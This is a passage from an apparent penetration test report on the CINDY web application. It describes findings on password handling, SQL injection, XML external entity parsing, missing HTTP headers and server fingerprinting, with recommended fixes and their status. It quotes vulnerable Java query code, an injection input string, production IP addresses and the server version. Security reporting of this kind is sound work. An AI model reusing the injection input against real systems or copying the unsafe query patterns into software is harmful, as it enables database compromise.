<li>While masked as a password field, the password was reflected back to the user in the “view user” feature, and could be recovered using developer tools or by viewing the page source. Someone who recovers a cached page or views another user’s account will be able to compromise the user’s account.</li>
<li>A password complexity policy was not enforced. Setting a good password policy prevents users from choosing passwords that are easily guessable. OWASP recommends that complexity policies adhere to <a href="https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret">NIST guidelines on password complexity</a>:
<ul>
<li>A minimum password length of 8.</li>
<li>Does not match common passwords, passwords obtained from previous breach corpuses, dictionary words, repetitive or sequential characters (e.g. ‘aaaaaa’, ‘1234abcd’), or context-specific words, such as the name of the service, the username, and derivatives thereof.</li>
<li>NIST recommend that the application should offer guidance to users when choosing a password, such as a password strength indicator.</li>
</ul></li>
</ul>
<p>Colman Communciations understands that under certain circumstances it is necessary to store users passwords in a recoverable format (e.g. to assist in troubleshooting internet connections at an ISP). But such requirements should be carefully considered and limited to the minimum users required.</p>
<h3 id="treatments-6">Treatments</h3>
<div class="treatment">
<ol>
<li>Encrypt all passwords using a strong, scalable hashing algorithm such as PBKDF2, bcrypt or scrypt and use a unique salt for each credential.</li>
<li>Ensure that passwords are not included in responses when viewing user details.</li>
<li>Implement a password complexity policy that aligns with NIST recommendations.</li>
</ol>
</div>
<p>BTB have hashed passwords using PBE with unique salts and a iteration count of 1000. Passwords are no longer reflected back to end users inside responses. A password complexity policy has been implemented which is 8 characters minimum, with at least 1 uppercase and 1 special character. Users are forced to change their password on login if the user has not changed their password for 3 months. BTB have provided code snippets as evidence.</p>
<h3 id="references-6">References</h3>
<ul>
<li><a href="##%20Examine%20user%20search/view/add%20features">Examine user search/view/add features</a></li>
</ul>
<h2 id="v_sqli.name" class="finding">Functions vulnerable to SQL injection</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">Rating</th>
<th style="text-align: left;">Status</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><span class="rating"><span class="med">Medium</span></span></td>
<td style="text-align: left;">Fixed</td>
</tr>
</tbody>
</table>
<h3 id="description-7">Description</h3>
<p>Several instance of unsafe string concatenation were discovered that could lead to SQL injection.</p>
<ul>
<li>Method uploadAndProcess in ReferenceDataImporter.class: the contents of a file which includes wholesaler information is read, parsed, and a number of queries executed using the data without validation. The logic related to parsing the file was complex and it wasn’t clear under what conditions injection could occur.</li>
</ul>
<div class="sourceCode" id="cb3"><pre class="sourceCode java"><code class="sourceCode java"><a class="sourceLine" id="cb3-1" data-line-number="1">        <span class="bu">String</span> firstToken = csvTokenizer.<span class="fu">nextElement</span>().<span class="fu">toString</span>();</a>
<a class="sourceLine" id="cb3-2" data-line-number="2"></a>
<a class="sourceLine" id="cb3-3" data-line-number="3">        <span class="kw">... </span>snip ...</a>
<a class="sourceLine" id="cb3-4" data-line-number="4"></a>
<a class="sourceLine" id="cb3-5" data-line-number="5">        <span class="kw">else</span> <span class="kw">if</span> (currentTable.<span class="fu">equals</span>(<span class="st">&quot;ref_wholesaler&quot;</span>))</a>
<a class="sourceLine" id="cb3-6" data-line-number="6">        {</a>
<a class="sourceLine" id="cb3-7" data-line-number="7">          <span class="bu">Statement</span> stmt = (<span class="bu">Statement</span>)conn.<span class="fu">createStatement</span>();</a>
<a class="sourceLine" id="cb3-8" data-line-number="8">          <span class="bu">ResultSet</span> rs = stmt.<span class="fu">executeQuery</span>(<span class="st">&quot;SELECT * FROM ref_wholesaler where code = &#39;&quot;</span> + firstToken + <span class="st">&quot;&#39;&quot;</span>);</a>
<a class="sourceLine" id="cb3-9" data-line-number="9">          <span class="kw">if</span> (!rs.<span class="fu">next</span>())</a>
<a class="sourceLine" id="cb3-10" data-line-number="10">          {</a>
<a class="sourceLine" id="cb3-11" data-line-number="11">            LOG.<span class="fu">debug</span>(<span class="st">&quot;Adding to &quot;</span> + <span class="kw">this</span>.<span class="fu">properties</span>.<span class="fu">getProperty</span>(<span class="st">&quot;DATABASE&quot;</span>) + <span class="st">&quot; : class com.a3.domain.common.Wholesaler : &quot;</span> + firstToken);</a>
<a class="sourceLine" id="cb3-12" data-line-number="12">            stmt.<span class="fu">executeUpdate</span>(<span class="st">&quot;INSERT INTO ref_wholesaler VALUES (&#39;&quot;</span> + firstToken + <span class="st">&quot;&#39;,&#39;&quot;</span> + csvTokenizer.<span class="fu">nextElement</span>().<span class="fu">toString</span>() + </a>
<a class="sourceLine" id="cb3-13" data-line-number="13">              <span class="st">&quot;&#39;,&#39;&quot;</span> + csvTokenizer.<span class="fu">nextElement</span>().<span class="fu">toString</span>() + <span class="st">&quot;&#39;,&#39;system&#39;,&#39;&quot;</span> + file_date + <span class="st">&quot;&#39;)&quot;</span>);</a>
<a class="sourceLine" id="cb3-14" data-line-number="14">          }</a>
<a class="sourceLine" id="cb3-15" data-line-number="15">        }</a></code></pre></div>
<ul>
<li>Method doesServiceNumbersExist in ServiceNumberDirectDAO.class: the supplied list of service numbers may be user controlled. When entering service numbers, input validation checks allowed entry of “78654a’) or (‘1’=’1”.</li>
</ul>
<div class="sourceCode" id="cb4"><pre class="sourceCode java"><code class="sourceCode java"><a class="sourceLine" id="cb4-1" data-line-number="1">  <span class="kw">public</span> <span class="dt">boolean</span> <span class="fu">doesServiceNumbersExist</span>(<span class="bu">String</span> db, <span class="bu">List</span>&lt;<span class="bu">String</span>&gt; numbers)</a>
<a class="sourceLine" id="cb4-2" data-line-number="2">    <span class="kw">throws</span> <span class="bu">Exception</span></a>
<a class="sourceLine" id="cb4-3" data-line-number="3">  {</a>
<a class="sourceLine" id="cb4-4" data-line-number="4">    <span class="bu">Connection</span> connection = <span class="fu">getConnection</span>(<span class="kw">false</span>);</a>
<a class="sourceLine" id="cb4-5" data-line-number="5">    <span class="bu">StringBuffer</span> numberStringBuffer = <span class="kw">new</span> <span class="bu">StringBuffer</span>();</a>
<a class="sourceLine" id="cb4-6" data-line-number="6">    <span class="kw">for</span> (<span class="bu">String</span> number : numbers)</a>
<a class="sourceLine" id="cb4-7" data-line-number="7">    {</a>
<a class="sourceLine" id="cb4-8" data-line-number="8">      <span class="kw">if</span> (numberStringBuffer.<span class="fu">length</span>() &gt; <span class="dv">0</span>) {</a>
<a class="sourceLine" id="cb4-9" data-line-number="9">        numberStringBuffer.<span class="fu">append</span>(<span class="st">&quot;,&quot;</span>);</a>
<a class="sourceLine" id="cb4-10" data-line-number="10">      }</a>
<a class="sourceLine" id="cb4-11" data-line-number="11">      numberStringBuffer.<span class="fu">append</span>(<span class="st">&quot;&#39;&quot;</span> + </a>
<a class="sourceLine" id="cb4-12" data-line-number="12">        StringUtil.<span class="fu">standardizeNumber</span>(number) + <span class="st">&quot;&#39;&quot;</span>);</a>
<a class="sourceLine" id="cb4-13" data-line-number="13">    }</a>
<a class="sourceLine" id="cb4-14" data-line-number="14">    <span class="bu">String</span> sql = <span class="st">&quot;select * from &quot;</span> + db + </a>
<a class="sourceLine" id="cb4-15" data-line-number="15">      <span class="st">&quot;.service_number where service_number in (&quot;</span> + </a>
<a class="sourceLine" id="cb4-16" data-line-number="16">      numberStringBuffer.<span class="fu">toString</span>() + <span class="st">&quot;)&quot;</span>;</a>
<a class="sourceLine" id="cb4-17" data-line-number="17">    <span class="bu">Statement</span> statement = connection.<span class="fu">createStatement</span>();</a>
<a class="sourceLine" id="cb4-18" data-line-number="18">    </a>
<a class="sourceLine" id="cb4-19" data-line-number="19">    <span class="bu">ResultSet</span> resultSet = statement.<span class="fu">executeQuery</span>(sql);</a>
<a class="sourceLine" id="cb4-20" data-line-number="20">    <span class="dt">boolean</span> result = <span class="kw">false</span>;</a>
<a class="sourceLine" id="cb4-21" data-line-number="21">    <span class="kw">if</span> (resultSet.<span class="fu">next</span>()) {</a>
<a class="sourceLine" id="cb4-22" data-line-number="22">      result = <span class="kw">true</span>;</a>
<a class="sourceLine" id="cb4-23" data-line-number="23">    }</a>
<a class="sourceLine" id="cb4-24" data-line-number="24">    <span class="fu">cleanup</span>(resultSet, <span class="kw">false</span>);</a>
<a class="sourceLine" id="cb4-25" data-line-number="25">    <span class="kw">return</span> result;</a>
<a class="sourceLine" id="cb4-26" data-line-number="26">  }</a></code></pre></div>
<ul>
<li>Method insertSERRecord in EventDAOImpl.class: the review did not identify whether the supplied serRecord can come from an untrusted source.</li>
</ul>
<div class="sourceCode" id="cb5"><pre class="sourceCode java"><code class="sourceCode java"><a class="sourceLine" id="cb5-1" data-line-number="1">  <span class="kw">public</span> <span class="dt">void</span> <span class="fu">insertSERRecord</span>(TelstraSER serRecord)</a>
<a class="sourceLine" id="cb5-2" data-line-number="2">  {</a>
<a class="sourceLine" id="cb5-3" data-line-number="3">    <span class="bu">Statement</span> statement = <span class="kw">null</span>;</a>
<a class="sourceLine" id="cb5-4" data-line-number="4">    <span class="kw">try</span></a>
<a class="sourceLine" id="cb5-5" data-line-number="5">    {</a>
<a class="sourceLine" id="cb5-6" data-line-number="6">      statement = <span class="fu">getSession</span>().<span class="fu">connection</span>().<span class="fu">createStatement</span>();</a>
<a class="sourceLine" id="cb5-7" data-line-number="7">      <span class="bu">ResultSet</span> rs = statement</a>
<a class="sourceLine" id="cb5-8" data-line-number="8">        .<span class="fu">executeQuery</span>(<span class="st">&quot;select * from telstra_ser where service_number = &#39;&quot;</span> + </a>
<a class="sourceLine" id="cb5-9" data-line-number="9">        serRecord.<span class="fu">getServiceNumber</span>() + </a>
<a class="sourceLine" id="cb5-10" data-line-number="10">        <span class="st">&quot;&#39; and call_type = &#39;&quot;</span> + </a>
<a class="sourceLine" id="cb5-11" data-line-number="11">        serRecord.<span class="fu">getCallTypeCode</span>() + </a>
<a class="sourceLine" id="cb5-12" data-line-number="12">        <span class="st">&quot;&#39; and (date_off = &#39;null&#39; or date_off = &#39;&#39;) and quantity = &#39;&quot;</span> + </a>
<a class="sourceLine" id="cb5-13" data-line-number="13">        serRecord.<span class="fu">getQuantity</span>() + <span class="st">&quot;&#39; order by id&quot;</span>);</a></code></pre></div>
<ul>
<li>Method doesServiceNumbersExist in TestServiceNumberAlreadyExists.class: might be vulnerable.</li>
</ul>
<div class="sourceCode" id="cb6"><pre class="sourceCode java"><code class="sourceCode java"><a class="sourceLine" id="cb6-1" data-line-number="1"><span class="kw">public</span> <span class="dt">boolean</span> <span class="fu">doesServiceNumbersExist</span>(<span class="bu">String</span> db, <span class="bu">List</span>&lt;<span class="bu">String</span>&gt; numbers, <span class="bu">Connection</span> connection)</a>
<a class="sourceLine" id="cb6-2" data-line-number="2">    <span class="kw">throws</span> <span class="bu">Exception</span></a>
<a class="sourceLine" id="cb6-3" data-line-number="3">  {</a>
<a class="sourceLine" id="cb6-4" data-line-number="4">    <span class="bu">StringBuffer</span> numberStringBuffer = <span class="kw">new</span> <span class="bu">StringBuffer</span>();</a>
<a class="sourceLine" id="cb6-5" data-line-number="5">    <span class="kw">for</span> (<span class="bu">String</span> number : numbers)</a>
<a class="sourceLine" id="cb6-6" data-line-number="6">    {</a>
<a class="sourceLine" id="cb6-7" data-line-number="7">      <span class="kw">if</span> (numberStringBuffer.<span class="fu">length</span>() &gt; <span class="dv">0</span>) {</a>
<a class="sourceLine" id="cb6-8" data-line-number="8">        numberStringBuffer.<span class="fu">append</span>(<span class="st">&quot;,&quot;</span>);</a>
<a class="sourceLine" id="cb6-9" data-line-number="9">      }</a>
<a class="sourceLine" id="cb6-10" data-line-number="10">      numberStringBuffer.<span class="fu">append</span>(<span class="st">&quot;&#39;&quot;</span> + StringUtil.<span class="fu">standardizeNumber</span>(number) + <span class="st">&quot;&#39;&quot;</span>);</a>
<a class="sourceLine" id="cb6-11" data-line-number="11">    }</a>
<a class="sourceLine" id="cb6-12" data-line-number="12">    <span class="bu">String</span> sql = <span class="st">&quot;select * from &quot;</span> + db + <span class="st">&quot;.service_number where service_number in (&quot;</span> + numberStringBuffer.<span class="fu">toString</span>() + <span class="st">&quot;)&quot;</span>;</a>
<a class="sourceLine" id="cb6-13" data-line-number="13">    <span class="bu">System</span>.<span class="fu">out</span>.<span class="fu">println</span>(sql);</a>
<a class="sourceLine" id="cb6-14" data-line-number="14">    <span class="bu">Statement</span> statement = connection.<span class="fu">createStatement</span>();</a>
<a class="sourceLine" id="cb6-15" data-line-number="15">    </a>
<a class="sourceLine" id="cb6-16" data-line-number="16">    <span class="bu">ResultSet</span> resultSet = statement.<span class="fu">executeQuery</span>(sql);</a></code></pre></div>
<p>Overall there were a large number of SQL queries that did not make use of parameterised statements, but did not appear to draw their input from sources that could be user controlled. A full list has not been compiled but should be readily identified by searching the source code for the string “executeQuery”.</p>
<h3 id="treatments-7">Treatments</h3>
<div class="treatment">
<ol>
<li>Use prepared statements to construct all SQL queries. https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet contains more information including alternative treatments if prepared statements are not practical.</li>
</ol>
</div>
<p>BTB have have reviewed the code and either updated methods to use prepared statements or deprecated them. BTB have provided code snippets as evidence.</p>
<h3 id="references-7">References</h3>
<ul>
<li><a href="####%20SQL%20Injection%7D">SQL Injection</a></li>
</ul>
<h2 id="v_xxe.name" class="finding">XML External Entity Injection</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">Rating</th>
<th style="text-align: left;">Status</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><span class="rating"><span class="med">Medium</span></span></td>
<td style="text-align: left;">Fixed</td>
</tr>
</tbody>
</table>
<h3 id="description-8">Description</h3>
<p>One potential instance of XML external entity injection was discovered in the getBPayments method of EziDebtPaymentImpl.class. The DOM Parser was not configured to disable external entity processing after creation, and the remote DTD is supplied to the parser.</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode java"><code class="sourceCode java"><a class="sourceLine" id="cb7-1" data-line-number="1">  <span class="kw">public</span> <span class="bu">List</span>&lt;<span class="bu">String</span>&gt; <span class="fu">getBPayments</span>(SystemParamService systemParamService)</a>
<a class="sourceLine" id="cb7-2" data-line-number="2">  {</a>
<a class="sourceLine" id="cb7-3" data-line-number="3">    DOMParser parser = <span class="kw">new</span> <span class="fu">DOMParser</span>();</a>
<a class="sourceLine" id="cb7-4" data-line-number="4">    <span class="bu">List</span>&lt;<span class="bu">String</span>&gt; ret = <span class="kw">new</span> <span class="bu">ArrayList</span>();</a>
<a class="sourceLine" id="cb7-5" data-line-number="5">    <span class="kw">try</span></a>
<a class="sourceLine" id="cb7-6" data-line-number="6">    {</a>
<a class="sourceLine" id="cb7-7" data-line-number="7">      PaymentExchangeLocator pel = <span class="kw">new</span> <span class="fu">PaymentExchangeLocator</span>();</a>
<a class="sourceLine" id="cb7-8" data-line-number="8">      pel.<span class="fu">setPaymentExchangeSoapEndpointAddress</span>(systemParamService.<span class="fu">getSystemParamString</span>(SystemParamKey.<span class="fu">EZIDEBIT_SERVER_URL</span>));</a>
<a class="sourceLine" id="cb7-9" data-line-number="9">      PaymentExchangeSoap pes = pel.<span class="fu">getPaymentExchangeSoap</span>();</a>
<a class="sourceLine" id="cb7-10" data-line-number="10">      <span class="bu">Calendar</span> cal = <span class="bu">Calendar</span>.<span class="fu">getInstance</span>();</a>
<a class="sourceLine" id="cb7-11" data-line-number="11">      cal.<span class="fu">add</span>(<span class="dv">5</span>, <span class="dv">-7</span>);</a>
<a class="sourceLine" id="cb7-12" data-line-number="12">      <span class="bu">String</span> result = pes.<span class="fu">getPaymentsExXmlString</span>(systemParamService.<span class="fu">getSystemParamString</span>(SystemParamKey.<span class="fu">EZIDEBIT_KEY</span>), <span class="st">&quot;ALL&quot;</span>, <span class="st">&quot;ALL&quot;</span>, <span class="st">&quot;ALL&quot;</span>, <span class="st">&quot;&quot;</span>, DateUtil.<span class="fu">safeFormatDate</span>(cal.<span class="fu">getTime</span>(), DateFormatKey.<span class="fu">DATE_FORMAT_YYYY_MM_DD</span>), DateUtil.<span class="fu">safeFormatDate</span>(<span class="kw">new</span> <span class="bu">Date</span>(), DateFormatKey.<span class="fu">DATE_FORMAT_YYYY_MM_DD</span>), <span class="st">&quot;SETTLEMENT&quot;</span>, <span class="st">&quot;&quot;</span>, <span class="st">&quot;&quot;</span>);</a>
<a class="sourceLine" id="cb7-13" data-line-number="13">      </a>
<a class="sourceLine" id="cb7-14" data-line-number="14">      <span class="co">// Remote DTD in supplied to parser.</span></a>
<a class="sourceLine" id="cb7-15" data-line-number="15">      <span class="bu">ByteArrayInputStream</span> bis = <span class="kw">new</span> <span class="bu">ByteArrayInputStream</span>((<span class="st">&quot;&lt;?xml version=</span><span class="sc">\&quot;</span><span class="st">1.0</span><span class="sc">\&quot;</span><span class="st"> encoding=</span><span class="sc">\&quot;</span><span class="st">ISO-8859-1</span><span class="sc">\&quot;</span><span class="st">?&gt;</span><span class="sc">\n</span><span class="st">&quot;</span> + result).<span class="fu">getBytes</span>());</a>
<a class="sourceLine" id="cb7-16" data-line-number="16">      <span class="bu">InputSource</span> is = <span class="kw">new</span> <span class="bu">InputSource</span>(bis);</a>
<a class="sourceLine" id="cb7-17" data-line-number="17">      parser.<span class="fu">parse</span>(is);</a></code></pre></div>
<p>Due to time restrictions exploitation was not attempted, but in theory could result in disclosure of system files, server side request forgery (including port scanning) or denial of service.</p>
<h3 id="treatments-8">Treatments</h3>
<div class="treatment">
<ol>
<li>Configure the XML parser not to parse XML External Entities as per https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</li>
</ol>
</div>
<p>BTB state they have deprecated this function.</p>
<h3 id="references-8">References</h3>
<ul>
<li><a href="####%20XML%20Entity%20Injection">XML Entity Injection</a></li>
</ul>
<h2 id="v_miss_head.name" class="finding">Missing HTTP headers</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">Rating</th>
<th style="text-align: left;">Status</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><span class="rating"><span class="low">Low</span></span></td>
<td style="text-align: left;">Fixed</td>
</tr>
</tbody>
</table>
<h3 id="description-9">Description</h3>
<p>The application does not set HTTP headers according to security best practice.</p>
<p>Missing headers, recommended settings and their purposes are detailed below.</p>
<ul>
<li><strong>X-Frame-Options: DENY</strong> - X-Frame-Options prevents a third party website from including this website within an iFrame. This can lead to a number of attacks including ClickJacking (or a “UI redress attack”), which is where an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they were intending to click on the the top level page. Thus, the attacker is “hijacking” clicks meant for their page and routing them to another page, most likely owned by another application, domain, or both. Click-jacking attacks can also be used to log keystrokes and steal passwords. Further information on possible values for X-Frame-Options can be found at https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options.</li>
<li><strong>Cache-control: no-store</strong> and <strong>Pragma: no-cache</strong> - These headers direct browsers not to cache the page. If an attacker is able to later access a users workstation, they may be able to recover sensitive data from the application.</li>
<li><strong>Strict-Transport-Security: max-age=31536000; includeSubDomains</strong> - HTTP Strict Transport Security directs the browser that the page should always be encrypted (i.e. to request the encrypted resource) and to apply strict certificate validation. This prevents three threats:
<ol>
<li>User bookmarks or manually types http://example.com and is subject to a man-in-the-middle attacker. HSTS automatically redirects HTTP requests to HTTPS for the target domain.</li>
<li>Web application that is intended to be purely HTTPS inadvertently contains HTTP links or serves content over HTTP. HSTS automatically redirects HTTP requests to HTTPS for the target domain.</li>
<li>A man-in-the-middle attacker attempts to intercept traffic from a victim user using an invalid certificate and hopes the user will accept the bad certificate. HSTS does not allow a user to override the invalid certificate message. The max-age directive tells the browser how many seconds it should cache the HSTS rule, with the recommended value being 1 year. The includeSubDomains directive tells the browser that the rule should be applied to all sub-domains of the application.</li>
</ol></li>
<li>__Content-Security-Policy: default-src ‘self’ *.trusted.com__ - Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. The example setting allows content to be loaded from the origin domain and all sub-domains of trusted.com. Configuring content security policy can be a complicated exercise, especially where the site uses content from a number of different sources (especially those that are user defined). https://developers.google.com/web/fundamentals/security/csp/ provides more information on how to configure CSP, and a tool such as https://oxdef.info/csp-tester/ can assist in generating a functional policy.</li>
<li><strong>X-XSS-Protection: 1; mode=block</strong> - The HTTP X-XSS-Protection response header is a feature of Internet Explorer, Chrome and Safari that stops pages from loading when they detect reflected cross-site scripting (XSS) attacks. Although these protections are largely unnecessary in modern browsers when sites implement a strong Content-Security-Policy that disables the use of inline JavaScript (‘unsafe-inline’), they can still provide protections for users of older web browsers that don’t yet support CSP. The example value directs the browser to detect reflected XSS attacks and prevent the page from loading if one is discovered. If CSP has been properly configured, setting the header value to “X-XSS-Protection: 0” will not result in a degradation in security and prevent any rendering errors caused by bugs in the browser’s XSS protection filter.</li>
<li><strong>X-Content-Type-Options: nosniff</strong> - X-Content-Type-Options is a marker used by the server to indicate that the MIME types advertised in the Content-Type headers should not be changed and be followed. This allows to opt-out of MIME type sniffing, where a browser would attempt to detect a resource’s MIME type based on its content. This setting will prevent scenarios where content sniffing could transform non-executable MIME types into executable MIME types.</li>
<li><strong>Referrer-Policy: same-origin</strong> - The referrer-policy header directs the browser only to include a referrer header (stating the resource that generated the current request) under certain conditions. This can be useful to protect an user’s privacy from cross domain refferer leakage, but may break analytics platforms. In the example value a referrer will be sent for same-site origins, but cross-origin requests will contain no referrer information. Further information about valid directives can be found at https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy.</li>
</ul>
<h3 id="treatments-9">Treatments</h3>
<div class="treatment">
<ol>
<li>Set each of the HTTP headers as recommended above.</li>
</ol>
</div>
<p>BTB have set the headers as recommended and provided configuration files as evidence.</p>
<h3 id="references-9">References</h3>
<ul>
<li><a href="###%20Application%20reconnaissance">Application reconnaissance</a></li>
<li><a href="###%20Examine%20authentication%20and%20session%20management">Examine authentication and session management</a></li>
</ul>
<h2 id="v_ip_whitelist.name" class="finding">IP whitelisting not in place as stated</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">Rating</th>
<th style="text-align: left;">Status</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><span class="rating"><span class="opt">Optional</span></span></td>
<td style="text-align: left;">Untested</td>
</tr>
</tbody>
</table>
<h3 id="description-10">Description</h3>
<p>White-listing of IP addresses for CINDY did not appear to be in place as stated.</p>
<p>Scans of the Internet facing infrastructure identified the two CINDY production instances located at 103.74.184.248 and 103.55.76.23. Testing from a second IP using a VPN gave the same result.</p>
<p>Further tests for application level access controls were not performed as login credentials had not been provided, and exploitation of the application via the vulnerability <a href="##%20%%7Bv_vuln_comps.name%7D">Vulnerable libraries in use</a> was deemed too risky.</p>
<h3 id="treatments-10">Treatments</h3>
<div class="treatment">
<ol>
<li>Limit access to the application via a firewall.</li>
</ol>
</div>
<h3 id="references-10">References</h3>
<ul>
<li><a href="###%20Scan%20external%20infrastructure">Scan external infrastructure</a></li>
</ul>
<h2 id="v_bus_log.name" class="finding">Business Logic Error</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">Rating</th>
<th style="text-align: left;">Status</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><span class="rating"><span class="opt">Optional</span></span></td>
<td style="text-align: left;">Untested</td>
</tr>
</tbody>
</table>
<h3 id="description-11">Description</h3>
<p>The application did not perform business logic checks to ensure that sell price inc GST is equal to sell price ex GST + 10%. It was possible to enter any value into either field without consideration for the other. For example the application would accept the following input:</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">Sell Price</th>
<th style="text-align: center;">Sell Price + GST</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">$200</td>
<td style="text-align: center;">$5</td>
</tr>
</tbody>
</table>
<h3 id="treatments-11">Treatments</h3>
<div class="treatment">
<ol>
<li>Modify application logic to auto populate Sell Price + GST based off the Sell Price.</li>
</ol>
</div>
<h3 id="references-11">References</h3>
<ul>
<li><a href="###%20Application%20reconnaissance">Application reconnaissance</a></li>
</ul>
<h2 id="v_serv_fp.name" class="finding">Application infrastructure can be fingerprinted</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">Rating</th>
<th style="text-align: left;">Status</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><span class="rating"><span class="opt">Optional</span></span></td>
<td style="text-align: left;">Fixed</td>
</tr>
</tbody>
</table>
<h3 id="description-12">Description</h3>
<p>It was possible to fingerprint the application infrastructure. While not a vulnerability in itself, server fingerprinting can be useful when targeting further attacks against the applications infrastructure. For example, in targeting the frameworks and components that make up the application.</p>
<p>While essentially a strategy of security through obscurity, making it more difficult to target a server will hamper such attacks.</p>
<h3 id="treatments-12">Treatments</h3>
<div class="treatment">
<ol>
<li>Replace default error pages with a generic page that does not identify the hosting platform nor disclose any information that may be used to infer the cause of the error (such as stake traces).</li>
<li>Strip page extensions to obfuscate the presentation frameworks in use.</li>
</ol>
</div>
<p>BTB state that they have modified the Tomcat configuration as recommended.</p>
<h3 id="references-12">References</h3>
<ul>
<li><a href="###%20Application%20reconnaissance">Application reconnaissance</a></li>
</ul>
<h1 id="methodology">Methodology</h1>
<h2 id="web-application-penetration-test-of-cindy">Web application penetration test of CINDY</h2>
<h3 id="application-reconnaissance">Application reconnaissance</h3>
<p>The tester logged into the application with the supplied credentials and examined its configuration.</p>
<ul>
<li>The following security-related headers had been set:
<ul>
<li>Server: BTB Australia</li>
</ul></li>
<li>The following headers had NOT been set:
<ul>
<li>X-Frame-Options</li>
<li>Cache-control: no-store</li>
<li>Pragma: no-cache</li>
<li>Strict-Transport-Security</li>
<li>Content-Security-Policy</li>
<li>X-XSS-Protection</li>
<li>X-Content-Type-Options</li>
<li>Referrer-Policy: no-referrer</li>
</ul></li>
<li>Making a request to “/not_there” identified the server as running apache tomcat version 8.0.47:</li>
</ul>
<div class="sourceCode" id="cb8"><pre class="sourceCode html"><code class="sourceCode html"><a class="sourceLine" id="cb8-1" data-line-number="1"><span class="dt">&lt;!DOCTYPE </span>html<span class="dt">&gt;</span><span class="kw">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span>Apache Tomcat/8.0.47 - Error report<span class="kw">&lt;/title&gt;&lt;style</span><span class="ot"> type=</span><span class="st">&quot;text/css&quot;</span><span class="kw">&gt;</span></a>
<a class="sourceLine" id="cb8-2" data-line-number="2">H1 {<span class="kw">font-family</span>:Tahoma,Arial,<span class="dv">sans-serif</span>;<span class="kw">color</span>:<span class="dv">white</span>;<span class="kw">background-color</span>:<span class="dv">#525D76</span>;<span class="kw">font-size</span>:<span class="dv">22px</span>;} </a>
<a class="sourceLine" id="cb8-3" data-line-number="3">H2 {<span class="kw">font-family</span>:Tahoma,Arial,<span class="dv">sans-serif</span>;<span class="kw">color</span>:<span class="dv">white</span>;<span class="kw">background-color</span>:<span class="dv">#525D76</span>;<span class="kw">font-size</span>:<span class="dv">16px</span>;} </a>
<a class="sourceLine" id="cb8-4" data-line-number="4">H3 {<span class="kw">font-family</span>:Tahoma,Arial,<span class="dv">sans-serif</span>;<span class="kw">color</span>:<span class="dv">white</span>;<span class="kw">background-color</span>:<span class="dv">#525D76</span>;<span class="kw">font-size</span>:<span class="dv">14px</span>;} </a>
<a class="sourceLine" id="cb8-5" data-line-number="5">BODY {<span class="kw">font-family</span>:Tahoma,Arial,<span class="dv">sans-serif</span>;<span class="kw">color</span>:<span class="dv">black</span>;<span class="kw">background-color</span>:<span class="dv">white</span>;} </a>
<a class="sourceLine" id="cb8-6" data-line-number="6">B {<span class="kw">font-family</span>:Tahoma,Arial,<span class="dv">sans-serif</span>;<span class="kw">color</span>:<span class="dv">white</span>;<span class="kw">background-color</span>:<span class="dv">#525D76</span>;} </a>
<a class="sourceLine" id="cb8-7" data-line-number="7">P {<span class="kw">font-family</span>:Tahoma,Arial,<span class="dv">sans-serif</span>;<span class="kw">background</span>:<span class="dv">white</span>;<span class="kw">color</span>:<span class="dv">black</span>;<span class="kw">font-size</span>:<span class="dv">12px</span>;}</a>
<a class="sourceLine" id="cb8-8" data-line-number="8">A {<span class="kw">color</span> : <span class="dv">black</span>;}A<span class="fu">.name</span> {<span class="kw">color</span> : <span class="dv">black</span>;}<span class="fu">.line</span> {<span class="kw">height</span>: <span class="dv">1px</span>; <span class="kw">background-color</span>: <span class="dv">#525D76</span>; <span class="kw">border</span>: <span class="dv">none</span>;}</a>
<a class="sourceLine" id="cb8-9" data-line-number="9"><span class="kw">&lt;/style&gt;</span></a>
<a class="sourceLine" id="cb8-10" data-line-number="10"><span class="kw">&lt;/head&gt;</span></a>
<a class="sourceLine" id="cb8-11" data-line-number="11">body&gt;<span class="kw">&lt;h1&gt;</span>HTTP Status 404 - /not_there<span class="kw">&lt;/h1&gt;</span></a>
<a class="sourceLine" id="cb8-12" data-line-number="12"><span class="kw">&lt;div</span><span class="ot"> class=</span><span class="st">&quot;line&quot;</span><span class="kw">&gt;&lt;/div&gt;</span></a>
<a class="sourceLine" id="cb8-13" data-line-number="13"><span class="kw">&lt;p&gt;&lt;b&gt;</span>type<span class="kw">&lt;/b&gt;</span> Status report<span class="kw">&lt;/p&gt;</span></a>
<a class="sourceLine" id="cb8-14" data-line-number="14"><span class="kw">&lt;p&gt;&lt;b&gt;</span>message<span class="kw">&lt;/b&gt;</span> <span class="kw">&lt;u&gt;</span>/not_there<span class="kw">&lt;/u&gt;&lt;/p&gt;</span></a>
<a class="sourceLine" id="cb8-15" data-line-number="15"><span class="kw">&lt;p&gt;&lt;b&gt;</span>description<span class="kw">&lt;/b&gt;</span> <span class="kw">&lt;u&gt;</span>The requested resource is not available.<span class="kw">&lt;/u&gt;&lt;/p&gt;</span></a>
<a class="sourceLine" id="cb8-16" data-line-number="16"><span class="kw">&lt;hr</span><span class="ot"> class=</span><span class="st">&quot;line&quot;</span><span class="kw">&gt;</span></a>
